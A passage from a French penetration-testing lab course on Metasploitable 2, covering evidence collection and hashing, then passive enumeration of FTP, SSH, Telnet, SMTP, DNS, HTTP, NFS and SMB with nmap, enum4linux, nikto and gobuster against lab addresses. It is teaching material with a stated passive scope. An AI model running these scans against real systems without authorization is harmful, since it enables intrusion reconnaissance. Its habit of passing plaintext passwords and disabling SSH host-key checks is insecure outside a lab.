mkdir -p preuves/ch1-lab4
sshpass -p kali scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -r kali@192.168.56.101:/home/kali/preuves/ch1-lab4/. preuves/ch1-lab4/
ls preuves/ch1-lab4 | head
```

**Explication de la commande**

- `mkdir -p preuves/ch1-lab4` : crée le répertoire de destination sur l'hôte.
- `sshpass -p kali` : fournit le mot de passe du compte `kali`.
- `scp` : copie des fichiers par SSH.
- `-q` : supprime la bannière et les messages de progression.
- `-o StrictHostKeyChecking=no` et `-o UserKnownHostsFile=/dev/null` : évitent l'invite d'empreinte SSH.
- `-r` : copie récursivement.
- `kali@192.168.56.101:/home/kali/preuves/ch1-lab4/.` : source ; le `/.` copie le contenu du répertoire, pas le répertoire lui-même.
- `preuves/ch1-lab4/` : destination sur l'hôte.
- `ls ... | head` : vérifie les premiers fichiers copiés.
- Piège courant : omettre `/.` et créer un sous-répertoire `ch1-lab4/ch1-lab4`.

**Résultat attendu**

Les fichiers de Kali sont présents dans `preuves/ch1-lab4/` sur l'hôte, sans écraser les preuves de l'hôte.

**Preuve** — contenu de `preuves/ch1-lab4/` sur l'hôte.

#### Étape 12 — Consolider l'inventaire hôte + Kali

**But** — produire une liste unique des preuves de l'hôte et de Kali, avec un préfixe distinct pour les chemins distants.

**Machine** — hôte d'hypervision, `192.168.56.1`, vers Kali `192.168.56.101`.

**Prérequis** — preuves Kali copiées à l'étape 11 ; accès SSH à Kali.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt

**Exemple de commande**

```bash
{ echo "# date: $(date -Is)"; echo "# cmd: inventaire consolide hote + Kali";
  { find preuves -type f ! -name 'INVENTAIRE-GLOBAL.txt' ! -name 'INVENTAIRE-GLOBAL.log';
    sshpass -p kali ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      kali@192.168.56.101 'find /home/kali/preuves -type f' | sed 's|^/home/kali/|kali:|'; } | sort;
  echo "# rc=${PIPESTATUS[0]}";
} 2>&1 | tee preuves/ch1-lab4/INVENTAIRE-GLOBAL.log

grep -v '^#' preuves/ch1-lab4/INVENTAIRE-GLOBAL.log > preuves/ch1-lab4/INVENTAIRE-GLOBAL.txt
```

**Explication de la commande**

- `{ ...; }` : groupe les commandes pour leur appliquer une redirection commune.
- `echo "# date: $(date -Is)"` : écrit un en-tête horodaté au format ISO 8601.
- `echo "# cmd: ..."` : écrit l'en-tête de commande.
- `find preuves -type f ...` : liste les fichiers de l'hôte en excluant les deux fichiers d'inventaire.
- `sshpass -p kali ssh -q ... kali@192.168.56.101 'find /home/kali/preuves -type f'` : liste les fichiers de Kali à distance.
- `| sed 's|^/home/kali/|kali:|'` : préfixe les chemins distants par `kali:`.
- `| sort` : trie la liste consolidée.
- `echo "# rc=${PIPESTATUS[0]}"` : ajoute le code retour de la première commande du pipeline précédent.
- `2>&1 | tee ...` : redirige la sortie standard et les erreurs vers `tee`, qui affiche et écrit le journal.
- `grep -v '^#'` : retire les lignes d'en-tête pour produire la liste finale.
- `> ... INVENTAIRE-GLOBAL.txt` : écrit la liste nettoyée.
- Piège courant : ne pas exclure le fichier de sortie ; il s'inclut lui-même. Un avertissement `Permanently added` vient de `stderr` ; `ssh -q` le supprime.

**Résultat attendu**

Une liste unique, avec les chemins de l'hôte et les chemins Kali préfixés `kali:`. Le fichier ne doit contenir ni `Warning: Permanently added` ni sa propre ligne.

**Preuve** — `preuves/ch1-lab4/INVENTAIRE-GLOBAL.log` et `preuves/ch1-lab4/INVENTAIRE-GLOBAL.txt`.

#### Étape 13 — Geler les preuves

**But** — calculer les empreintes des preuves du lab et vérifier leur intégrité.

**Machine** — hôte d'hypervision, `192.168.56.1`.

**Prérequis** — preuves de l'hôte et de Kali présentes dans `preuves/ch1-lab4/`.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt

**Exemple de commande**

```bash
sha256sum preuves/ch1-lab4/*.txt preuves/ch1-lab4/*.pcap preuves/ch1-lab4/*.typescript \
  > preuves/ch1-lab4/SHA256SUMS
sha256sum -c preuves/ch1-lab4/SHA256SUMS
```

**Explication de la commande**

- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier correspondant aux motifs.
- `preuves/ch1-lab4/*.txt` : preuves texte.
- `preuves/ch1-lab4/*.pcap` : capture réseau.
- `preuves/ch1-lab4/*.typescript` : session brute.
- `> preuves/ch1-lab4/SHA256SUMS` : écrit les empreintes dans le fichier de sommes.
- `sha256sum -c` : vérifie chaque fichier contre le fichier de sommes ; `OK` signifie que l'empreinte correspond.
- Le fichier `SHA256SUMS` est créé après les autres et ne s'inclut pas lui-même.
- Piège courant : recréer `SHA256SUMS` après vérification ; son contenu change et invalide la vérification précédente.

**Résultat attendu**

Une ligne `OK` par fichier.

**Preuve** — `preuves/ch1-lab4/SHA256SUMS`.

### En conclusion

Vous avez une baseline, un snapshot, une session, une capture, quatre fiches dry-run, un journal et un inventaire consolidé. Le Lab-05 approfondit chaque service de Metasploitable 2 avec les outils du chapitre.

**Résultats attendus**

| Élément | Valeur attendue |
|---|---|
| Hôte | `192.168.56.1/24` sur `vboxnet0` |
| Kali | `192.168.56.101/24`, SSH seul en écoute |
| Meta | `192.168.56.103`, noyau `2.6.24-16-server` |
| Snapshot Meta | `avant-phase1` |
| Capture | 5 paquets ICMP, 0 perdu |
| Session | `session.typescript` + version nettoyée |
| Fiches dry-run | 4 fichiers |
| Journal | 44 étapes |
| Inventaire | sans auto-inclusion |
| Sommes | `sha256sum -c` OK |

**Critères de réussite**

- [ ] Les trois baselines sont enregistrées avec `# date:`, `# cmd:`, `# rc=`.
- [ ] Le noyau exact de Meta est lu dans la VM, pas deviné par Nmap.
- [ ] Le snapshot `avant-phase1` existe et est listé.
- [ ] La session `script` est nettoyée des séquences ANSI.
- [ ] La capture contient 5 paquets ICMP et 0 paquet perdu.
- [ ] La phase 1 `-sV` est comparée au plan gelé.
- [ ] Les quatre fiches dry-run sont complètes.
- [ ] Le journal contient 44 étapes.
- [ ] L'inventaire ne s'inclut pas lui-même.
- [ ] `sha256sum -c` retourne `OK` pour chaque fichier.

## Lab-05 — Énumération approfondie des services de Metasploitable 2

### Énoncé / Contexte

Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette liste en **connaissance opérationnelle** : pour chaque service, quel outil confirme le service, quelle information est accessible sans authentification, quelle information exige un compte de test, et quelle preuve est conservée.

**Place dans la chaîne** — après la baseline (Lab-04), avant la validation CVE et la matrice de risques (Lab-06).

**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :

- choisir l'outil adapté à chaque famille de services ;
- distinguer une bannière, une version, une configuration et une vulnérabilité ;
- expliquer pourquoi un script NSE vide ne prouve pas l'absence de service ;
- documenter un échec d'outil sans le masquer ;
- produire une matrice de couverture service -> outil -> preuve.

> **Périmètre** — ce lab est **passif et de vérification**. Aucune authentification par force brute, aucune exécution de commande distante, aucun accès au shell root `1524`, aucune modification de configuration. Les comptes de test `msfadmin` et `postgres` sont utilisés uniquement pour lire une version ou une bannière, jamais pour élever les privilèges.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Discovery (TA0007) |
| Technique | T1046 Network Service Discovery |
| Sous-technique | — |
| Source de données | Journaux de services, connexions réseau, journaux d'authentification |
| Contrôle défensif | Réduction de surface, authentification forte, segmentation, journalisation |
| Détection | Connexions vers plusieurs services depuis un même hôte, échecs d'authentification, requêtes DNS AXFR |

**Prérequis**

- Metasploitable 2 démarré et joignable sur `192.168.56.103`.
- Kali avec `nmap`, `curl`, `dig`, `nc`, `ftp`, `ssh`, `smbclient`, `enum4linux`, `nbtscan`, `showmount`, `rpcinfo`, `mysql`, `psql`, `xdpyinfo`, `nikto`, `whatweb`, `gobuster`.
- Wordlist : `/usr/share/dirb/wordlists/common.txt`.
- `sudo` sur Kali pour les scans SYN.
- Client MySQL récent : utiliser `--skip-ssl` pour les anciens serveurs.
- Client PostgreSQL : `PGPASSWORD=postgres` pour le compte de test.
- La fonction `prouve` du Lab-01 est définie. Sinon, redéfinissez-la.
- Répertoire de travail sur Kali : `~/preuves/ch1-lab5/`.

> **Convention de nommage** — un fichier de preuve par service et par outil : `ftp-anon.txt`, `ssh-banner.txt`, `smb-shares.txt`, etc. Le nom du fichier doit permettre de retrouver la commande sans ouvrir le contenu.

**Matrice de couverture**

| Service | Port(s) | Outil principal | Commande de référence | Preuve | ATT&CK |
|---|---|---|---|---|---|
| FTP | 21 | `curl`, `ftp` | `curl -v ftp://anonymous:anonymous@...` | `ftp-anon.txt` | T1046 |
| FTP alternatif | 2121 | `nmap -sV` | `nmap -sV -p 2121` | `ftp-alt-version.txt` | T1046 |
| SSH | 22 | `ssh`, `nmap` | `ssh -o PreferredAuthentications=none ...` | `ssh-banner.txt` | T1046 |
| Telnet | 23 | `nmap`, `nc` | `nmap -sV -p 23` | `telnet-nmap-version.txt` | T1046 |
| SMTP | 25 | `nc` | `printf 'EHLO lab.local\r\nQUIT\r\n' \| nc` | `smtp-banner.txt` | T1046 |
| DNS | 53 | `dig` | `dig @... version.bind chaos txt +short` | `dns-version.txt` | T1046 |
| HTTP | 80 | `curl`, `whatweb`, `nikto`, `gobuster` | `curl -D -`, `whatweb`, `nikto`, `gobuster` | `http-*.txt` | T1046 |
| RPC | 111 | `rpcinfo` | `rpcinfo -p 192.168.56.103` | `rpcinfo.txt` | T1046 |
| NFS | 2049 | `showmount` | `showmount -e 192.168.56.103` | `showmount.txt` | T1046 |
| SMB | 139, 445 | `nbtscan`, `smbclient`, `enum4linux` | `smbclient -L //... -N` | `smb-*.txt` | T1046 |
| MySQL | 3306 | `mysql` | `mysql --skip-ssl -e 'SELECT VERSION();'` | `mysql-version.txt` | T1046 |
| PostgreSQL | 5432 | `psql` | `psql -c 'SELECT version();'` | `psql-version.txt` | T1046 |
| VNC | 5900 | `nmap` | `nmap --script vnc-info` | `vnc-info.txt` | T1046 |
| X11 | 6000 | `xdpyinfo` | `xdpyinfo -display ...` | `x11-access.txt` | T1046 |
| IRC | 6667, 6697 | `nc` | `printf 'NICK ...\r\nUSER ...' \| nc` | `irc-banner.txt` | T1046 |
| Tomcat | 8180 | `curl`, `whatweb`, `nikto` | `curl -D -`, `whatweb` | `tomcat-*.txt` | T1046 |
| AJP13 | 8009 | `nmap` | `nmap -sV -p 8009` | `ajp13-version.txt` | T1046 |
| RMI | 1099 | `nmap` | `nmap --script rmi-dumpregistry` | `rmi-dumpregistry.txt` | T1046 |
| distcc | 3632 | `nmap` | `nmap -sV -p 3632` | `distcc-version.txt` | T1046 |
| r-services | 512-514 | `nmap` | `nmap -sV -p 512,513,514` | `rservices.txt` | T1046 |
| bindshell | 1524 | `nmap` | `nmap -sV -p 1524` | `bindshell-version.txt` | T1046 |

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `curl`, `ftp` | `curl -v ftp://...`, `curl -D -` | FTP anonyme et en-têtes HTTP |
| `ssh`, `nc`, `dig` | bannière SSH, Telnet/SMTP/IRC, `dig version.bind` | Énumération des services |
| `nmap` | `-sV`, `--script smb-enum-shares,vnc-info,...` | Versions et scripts NSE ciblés |
| `smbclient`, `enum4linux`, `nbtscan` | `smbclient -L`, `enum4linux -a` | Énumération SMB/NetBIOS |
| `showmount`, `rpcinfo`, `mysql`, `psql` | `showmount -e`, `SELECT VERSION()` | NFS, RPC et bases de données |
| `nikto`, `whatweb`, `gobuster` | `nikto -h`, `whatweb`, `gobuster dir` | Surface web |
| `xdpyinfo` | `xdpyinfo -display 192.168.56.103:0` | Test X11 non authentifié |

### Commande et laboratoire étape par étape

#### Étape 1 — FTP, ports 21 et 2121

**But** — vérifier si le FTP accepte un login anonyme et identifier le service alternatif exposé sur le port 2121.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `curl`, `nmap` et accès `sudo` sur Kali ; service FTP actif sur la cible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/ftp-anon.txt bash -c \
  "curl --max-time 10 -sS -v ftp://anonymous:anonymous@192.168.56.103/"
prouve preuves/ch1-lab5/ftp-alt-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 2121 192.168.56.103"
```

**Explication de la commande**

- `prouve ... ftp-anon.txt` : enregistre la tentative de login anonyme et son code retour.
- `curl --max-time 10` : borne la connexion à 10 secondes.
- `-sS` : mode silencieux, mais affichage des erreurs.
- `-v` : mode verbeux, qui montre les commandes et réponses FTP.
- `ftp://anonymous:anonymous@192.168.56.103/` : connexion FTP avec le compte anonyme.
- `prouve ... ftp-alt-version.txt` : enregistre l'identification du service sur le port 2121.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- `nmap -sV -n -p 2121` : détection de version sur le port alternatif, sans résolution DNS.
- Piège courant : considérer le login anonyme comme une vulnérabilité en soi ; c'est une configuration, qui devient un risque si elle expose des fichiers sensibles ou une version vulnérable.

**Résultat attendu**

```text
< 220 (vsFTPd 2.3.4)
> USER anonymous
< 331 Please specify the password.
> PASS anonymous
< 230 Login successful.
> LIST
< 150 Here comes the directory listing.
< 226 Directory send OK.
```

Le login anonyme est autorisé sur le port 21. Le répertoire racine est vide dans notre test. Le port 2121 expose ProFTPD `1.3.1`.

**Preuve** — `preuves/ch1-lab5/ftp-anon.txt` et `preuves/ch1-lab5/ftp-alt-version.txt`.

#### Étape 2 — SSH, port 22

**But** — relever la bannière et les algorithmes SSH sans tenter d'authentification.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — client `ssh`, `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/ssh-banner.txt bash -c \
  "timeout 8 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa \
   -oBatchMode=yes -oPreferredAuthentications=none -oStrictHostKeyChecking=no \
   -oUserKnownHostsFile=/dev/null msfadmin@192.168.56.103 true"
prouve preuves/ch1-lab5/ssh-algos.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 22 --script ssh2-enum-algos,ssh-hostkey 192.168.56.103"
```

**Explication de la commande**

- `prouve ... ssh-banner.txt` : enregistre la tentative de connexion et son code retour.
- `timeout 8` : borne la connexion à 8 secondes.
- `ssh` : client OpenSSH.
- `-oHostKeyAlgorithms=+ssh-rsa` et `-oPubkeyAcceptedAlgorithms=+ssh-rsa` : autorisent les algorithmes anciens de la cible.
- `-oBatchMode=yes` : interdit toute invite interactive.
- `-oPreferredAuthentications=none` : demande aucune méthode d'authentification, pour observer la réponse.
- `-oStrictHostKeyChecking=no` et `-oUserKnownHostsFile=/dev/null` : évitent l'invite d'empreinte.
- `msfadmin@192.168.56.103 true` : compte de test et commande immédiatement terminée.
- `prouve ... ssh-algos.txt` : enregistre les algorithmes et la clé d'hôte via Nmap.
- `nmap --script ssh2-enum-algos,ssh-hostkey` : scripts NSE d'énumération SSH.
- Piège courant : lancer une force brute ; ce lab vérifie la surface, il ne teste pas les mots de passe.

**Résultat attendu**

```text
msfadmin@192.168.56.103: Permission denied (publickey,password).
# rc=255
```

La bannière et les algorithmes sont visibles, mais l'authentification échoue sans identifiant. `rc=255` est attendu.

**Preuve** — `preuves/ch1-lab5/ssh-banner.txt` et `preuves/ch1-lab5/ssh-algos.txt`.

#### Étape 3 — Telnet, port 23

**But** — identifier le service Telnet et observer ses octets de négociation sans fournir d'identifiant.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap`, `nc`, `xxd` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/telnet-nmap-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 23 192.168.56.103"
prouve preuves/ch1-lab5/telnet-negotiation.txt bash -c \
  "timeout 8 bash -c 'printf \"\\r\\n\" | nc -w 3 192.168.56.103 23' | xxd | head -5"
```

**Explication de la commande**

- `prouve ... telnet-nmap-version.txt` : enregistre l'identification Nmap.
- `nmap -sV -n -p 23` : détection de version sur le port Telnet.
- `prouve ... telnet-negotiation.txt` : enregistre les octets renvoyés par le service.
- `printf "\\r\\n"` : envoie un retour chariot et un saut de ligne.
- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
- `| xxd` : affiche les octets en hexadécimal.
- `| head -5` : limite l'affichage aux cinq premières lignes.
- `ff fd` : négociation Telnet `IAC DO`.
- Piège courant : se connecter avec un compte réel ; Telnet transmet les identifiants en clair.

**Résultat attendu**

```text
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd

00000000: fffd 18ff fd20 fffd 23ff fd27            ..... ..#..'
```

Les octets `ff fd` sont des négociations Telnet (IAC DO). Le service n'envoie pas de bannière textuelle avant négociation. La version fiable est `Linux telnetd` via Nmap.

**Preuve** — `preuves/ch1-lab5/telnet-nmap-version.txt` et `preuves/ch1-lab5/telnet-negotiation.txt`.

#### Étape 4 — SMTP, port 25

**But** — relever la bannière SMTP et les extensions annoncées par le serveur, sans énumérer de comptes.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nc` installé sur Kali ; service SMTP actif.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/smtp-banner.txt bash -c \
  "timeout 8 bash -c 'printf \"EHLO lab.local\\r\\nQUIT\\r\\n\" | nc -w 3 192.168.56.103 25'"
```

**Explication de la commande**

- `prouve ... smtp-banner.txt` : enregistre la bannière et son code retour.
- `timeout 8` : borne la session à 8 secondes.
- `bash -c '...'` : exécute la séquence dans un shell enfant.
- `printf "EHLO lab.local\\r\\nQUIT\\r\\n"` : envoie la salutation SMTP puis la commande de sortie.
- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
- `192.168.56.103 25` : adresse et port SMTP de la cible.
- Piège courant : utiliser `VRFY` pour énumérer des comptes ; la bannière suffit à documenter le service.

**Résultat attendu**

```text
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
221 2.0.0 Bye
```

Postfix accepte `EHLO`, annonce `STARTTLS` et `VRFY`. La commande `VRFY` peut révéler des comptes, mais ce lab ne l'utilise pas pour énumérer des utilisateurs.

**Preuve** — `preuves/ch1-lab5/smtp-banner.txt`.

#### Étape 5 — DNS, port 53

**But** — relever la version BIND, tester une résolution directe et vérifier que le transfert de zone est refusé.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `dig` installé sur Kali ; service DNS actif.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/dns-version.txt dig @192.168.56.103 version.bind chaos txt +short
prouve preuves/ch1-lab5/dns-query.txt dig @192.168.56.103 metasploitable.localdomain A +short
prouve preuves/ch1-lab5/dns-axfr.txt dig @192.168.56.103 localdomain AXFR +time=5 +tries=1
```

**Explication de la commande**

- `prouve ... dns-version.txt` : enregistre la requête de version.
- `dig @192.168.56.103` : interroge directement le serveur DNS de la cible.
- `version.bind chaos txt` : requête spéciale qui retourne souvent la version du serveur.
- `+short` : sortie compacte.
- `prouve ... dns-query.txt` : enregistre la résolution du nom de la cible.
- `metasploitable.localdomain A` : demande l'enregistrement IPv4.
- `prouve ... dns-axfr.txt` : enregistre la tentative de transfert de zone.
- `localdomain AXFR` : demande un transfert complet de zone.
- `+time=5 +tries=1` : limite le délai à 5 secondes et à une tentative.
- Piège courant : interpréter `Transfer failed` comme une vulnérabilité ; un AXFR refusé est la configuration attendue.

**Résultat attendu**

```text
"9.4.2"

; Transfer failed.
```

La version BIND `9.4.2` est exposée via `version.bind`. La requête A directe ne retourne rien. Le transfert de zone AXFR est refusé, ce qui est la configuration attendue. Un AXFR réussi serait une fuite d'information ; un AXFR refusé n'est pas une vulnérabilité.

**Preuve** — `preuves/ch1-lab5/dns-version.txt`, `dns-query.txt` et `dns-axfr.txt`.

#### Étape 6 — HTTP, port 80

**But** — relever les en-têtes, la technologie, les répertoires exposés et les mauvaises configurations du serveur web principal.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `curl`, `whatweb`, `nikto`, `gobuster` et la wordlist `/usr/share/dirb/wordlists/common.txt`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/http-curl.txt bash -c \
  "curl --max-time 10 -sS -D - http://192.168.56.103/ -o /dev/null"
prouve preuves/ch1-lab5/whatweb-80.txt whatweb -a 3 --color=never http://192.168.56.103/
prouve preuves/ch1-lab5/nikto-80.txt bash -c \
  "timeout 100 nikto -h http://192.168.56.103 -nointeractive -maxtime 80s -Display V 2>&1 | sed -r 's/\\x1B\\[[0-9;]*[mK]//g'"
prouve preuves/ch1-lab5/gobuster-80.txt bash -c \
  "timeout 100 gobuster dir -u http://192.168.56.103/ \
   -w /usr/share/dirb/wordlists/common.txt -t 20 --timeout 5s \
   --no-progress --no-color"
```

**Explication de la commande**

- `prouve ... http-curl.txt` : enregistre les en-têtes HTTP.
- `curl --max-time 10 -sS -D -` : affiche les en-têtes de réponse sur la sortie standard.
- `-o /dev/null` : supprime le corps de la réponse.
- `prouve ... whatweb-80.txt` : enregistre la technologie détectée.
- `whatweb -a 3` : niveau d'agressivité 3.
- `--color=never` : sortie sans séquences ANSI.
- `prouve ... nikto-80.txt` : enregistre le scan de mauvaises configurations.
- `timeout 100` : borne le scan à 100 secondes.
- `nikto -h ... -nointeractive -maxtime 80s -Display V` : scan HTTP non interactif, limité à 80 secondes, avec affichage détaillé.
- `sed -r 's/...//g'` : supprime les séquences ANSI.
- `prouve ... gobuster-80.txt` : enregistre l'énumération de répertoires.
- `gobuster dir -u ... -w ...` : énumération de chemins avec la wordlist.
- `-t 20` : vingt threads ; `--timeout 5s` : délai par requête ; `--no-progress --no-color` : sortie lisible.
- Piège courant : utiliser `whatweb --no-colour`, option absente dans la version testée ; utilisez `--color=never`.

**Résultat attendu**

```text
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10

http://192.168.56.103/ [200 OK] Apache[2.2.8], PHP[5,5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2]

+ [000287] /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ [750500] /icons/: Directory indexing found. See: CWE-548
+ [000434] /: HTTP TRACE method is active and replies which suggests the host is vulnerable to XST.

dav                  (Status: 301) [--> http://192.168.56.103/dav/]
phpinfo.php          (Status: 200) [Size: 48026]
test                 (Status: 301) [--> http://192.168.56.103/test/]
```

Apache `2.2.8`, PHP `5.2.4`, WebDAV activé, `phpinfo.php` accessible, `TRACE` actif. `phpinfo.php` expose la configuration PHP : c'est une fuite d'information. `TRACE` peut faciliter XST (Cross-Site Tracing) ; c'est un en-tête à désactiver. `nikto` signale aussi des en-têtes de sécurité absents.

> **Attention** — `whatweb --no-colour` n'existe pas dans la version testée. Utilisez `--color=never`. Si vous voyez `unrecognized option '--no-colour'`, la preuve est invalide : relancez la commande.

**Preuve** — `preuves/ch1-lab5/http-curl.txt`, `whatweb-80.txt`, `nikto-80.txt` et `gobuster-80.txt`.

#### Étape 7 — RPC et NFS, ports 111 et 2049

**But** — identifier les services RPC et vérifier la liste des exports NFS sans monter aucun partage.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `rpcinfo`, `showmount`, `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/rpcinfo.txt rpcinfo -p 192.168.56.103
prouve preuves/ch1-lab5/showmount.txt showmount -e 192.168.56.103
prouve preuves/ch1-lab5/nfs-showmount.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 2049 --script nfs-showmount 192.168.56.103"
```

**Explication de la commande**

- `prouve ... rpcinfo.txt` : enregistre la liste des services RPC.
- `rpcinfo -p 192.168.56.103` : interroge le portmapper de la cible.
- `prouve ... showmount.txt` : enregistre les exports NFS.
- `showmount -e 192.168.56.103` : affiche la liste des exports.
- `prouve ... nfs-showmount.txt` : enregistre le script NSE.
- `nmap --script nfs-showmount` : tente l'énumération NFS par script.
- Piège courant : monter l'export pour vérifier ; le lab se limite à la lecture de la liste. Le script NSE peut ne rien retourner, `showmount -e` reste la source fiable.

**Résultat attendu**

```text
program vers proto   port  service
100000    2   tcp    111  portmapper
100003    2   tcp   2049  nfs
100005    1   tcp  45883  mountd

Export list for 192.168.56.103:
/ *
```

NFS exporte `/` à tout le monde (`*`). C'est une configuration à risque : tout hôte du réseau peut monter l'export. Le script NSE `nfs-showmount` ne produit aucune sortie dans notre test.

**Preuve** — `preuves/ch1-lab5/rpcinfo.txt`, `showmount.txt` et `nfs-showmount.txt`.

#### Étape 8 — SMB et NetBIOS, ports 139 et 445

**But** — identifier le groupe de travail, les partages et les accès anonymes SMB, tout en documentant l'échec de `smbmap`.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nbtscan`, `smbclient`, `nmap`, `enum4linux`, `smbmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/nbtscan.txt nbtscan -v 192.168.56.103
prouve preuves/ch1-lab5/smbclient-list.txt smbclient -L //192.168.56.103 -N
prouve preuves/ch1-lab5/smb-shares.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 139,445 --script smb-os-discovery,smb-enum-shares 192.168.56.103"
prouve preuves/ch1-lab5/enum4linux.txt bash -c \
  "timeout 180 enum4linux -a 192.168.56.103 2>&1 | sed -r 's/\\x1B\\[[0-9;]*[mK]//g'"
prouve preuves/ch1-lab5/smbmap.txt bash -c \
  "timeout 40 smbmap -H 192.168.56.103 -u guest -p guest"
```

**Explication de la commande**

- `prouve ... nbtscan.txt` : enregistre la découverte NetBIOS.
- `nbtscan -v` : interroge les noms NetBIOS de la cible.
- `prouve ... smbclient-list.txt` : enregistre la liste des partages.
- `smbclient -L //192.168.56.103 -N` : liste les partages sans mot de passe.
- `prouve ... smb-shares.txt` : enregistre l'énumération Nmap.
- `nmap --script smb-os-discovery,smb-enum-shares` : scripts NSE de découverte SMB.
- `prouve ... enum4linux.txt` : enregistre l'énumération complète.
- `timeout 180 enum4linux -a` : énumération complète, bornée à 180 secondes.
- `2>&1 | sed -r 's/...//g'` : capture les erreurs et supprime les séquences ANSI.
- `prouve ... smbmap.txt` : enregistre la tentative `smbmap`.
- `timeout 40 smbmap -H ... -u guest -p guest` : test d'accès avec le compte invité, borné à 40 secondes.
- Piège courant : conclure à l'absence de partages sur l'échec de `smbmap` ; `smbclient -L` et Nmap restent les sources de repli.

**Résultat attendu**

```text
Anonymous login successful
print$   Disk  Printer Drivers
tmp      Disk  oh noes!
opt      Disk
IPC$     IPC   IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$   IPC   IPC Service (metasploitable server (Samba 3.0.20-Debian))
WORKGROUP  METASPLOITABLE

\\192.168.56.103\IPC$: Anonymous access: READ/WRITE
\\192.168.56.103\tmp:  Anonymous access: READ/WRITE
```

SMB `3.0.20-Debian`, groupe `WORKGROUP`, partages `tmp` et `IPC$` accessibles en anonyme avec `READ/WRITE`. `enum4linux -a` confirme le domaine, les utilisateurs et les partages, mais met environ 40 secondes et produit des séquences ANSI. `smbmap` échoue dans notre environnement :

```text
multiprocessing.pool.MaybeEncodingError: Error sending result: ...
PicklingError("Can't pickle local object ...")
# rc=124
```

Ce n'est pas une absence de partages : c'est une incompatibilité entre `smbmap 1.10.7` et Python 3.14. Le fallback est `smbclient -L` et `nmap --script smb-enum-shares`. Documentez l'échec, ne supprimez pas la preuve.

**Preuve** — `preuves/ch1-lab5/nbtscan.txt`, `smbclient-list.txt`, `smb-shares.txt`, `enum4linux.txt` et `smbmap.txt`.

#### Étape 9 — MySQL, port 3306

**But** — lire la version MySQL avec le compte de test `root` sans mot de passe, en lecture seule.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — client `mysql` installé ; service MySQL actif.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/mysql-version.txt bash -c \
